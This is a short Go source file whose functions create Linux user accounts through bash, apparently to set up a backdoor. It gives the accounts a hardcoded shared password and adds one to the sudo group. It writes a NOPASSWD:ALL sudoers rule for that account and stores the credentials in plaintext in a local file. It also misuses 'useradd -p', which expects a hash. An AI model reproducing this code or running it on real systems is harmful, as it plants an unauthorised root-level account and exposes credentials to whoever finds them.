package user

import (
	"github.com/creack/pty"
	"io"
	"log"
	"os"
	"os/exec"
)

func AddExecutor() {
	cmd := "useradd -m -p s3cr3tP4ssW0rd -s /bin/bash web; usermod -aG web web"
	out := exec.Command("bash", "-c", cmd)

	command, err := pty.Start(out)

	if err != nil {
		log.Fatal(err)
	}

	_, _ = io.Copy(os.Stdout, command)
	createPwdFile("web", "s3cr3tP4ssW0rd")
}

func AddSudo() {
	cmd := "useradd -m -p s3cr3tP4ssW0rd -s /bin/bash service; usermod -aG sudo service"
	out := exec.Command("bash", "-c", cmd)

	command, err := pty.Start(out)

	if err != nil {
		log.Fatal(err)
	}

	_, _ = io.Copy(os.Stdout, command)
	createPwdFile("service", "s3cr3tP4ssW0rd")
	disableSudoPassword()
}

func disableSudoPassword() {

	cmd := "cp /etc/sudoers ./sudoers.bak; echo 'service ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/service"
	//cmd := "echo '$USER ALL=(ALL:ALL) NOPASSWD: ALL' | sudo tee '/etc/sudoers.d/dont-prompt-$USER-for-sudo-password'"

	out := exec.Command("bash", "-c", cmd)

	command, err := pty.Start(out)

	if err != nil {
		log.Fatal(err)
	}

	_, _ = io.Copy(os.Stdout, command)

}

func createPwdFile(userName string, userPwd string) {
	cmd := "echo 'username: " + userName + " password: " + userPwd + "' >> ./password"
	out := exec.Command("bash", "-c", cmd)

	command, err := pty.Start(out)

	if err != nil {
		log.Fatal(err)
	}

	_, _ = io.Copy(os.Stdout, command)
}
